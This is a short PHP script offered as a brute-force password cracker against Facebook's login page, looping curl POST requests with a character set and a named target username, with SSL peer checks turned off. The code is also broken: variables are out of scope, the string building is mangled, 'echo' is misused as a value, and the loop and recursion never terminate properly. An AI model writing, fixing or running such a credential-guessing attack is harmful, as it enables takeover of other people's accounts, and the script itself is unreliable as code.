<?php

global $wrong;
global $startpagina;
$time = microtime() * 100000;
$username = "kenkensquidkuddlephish";
echo "https://twitter.com/LizardL4nds";
$Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
$c_len = strlen($Pass); 
$min = 1;
$max = 12;
function bruteForce($min, $max, $Pass)
{
while(True)
{     
	
        $c = curl_init('https://www.facebook.com/login');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c); 
		
	for ($i = $min; $min < $max; $i++) 
	{        
		if ($min < $max - 1) 
		{    
			bruteForce($min, $max + 1, $Pass[$i]); 	
			$good = echo "Found:".$Pass[$i]."";
			if($str > "What's on your mind?") {return $Pass[$i];}
                        else {return False;}
		}
        }
}
} 
bruteForce($min, $max, $Pass);
?>
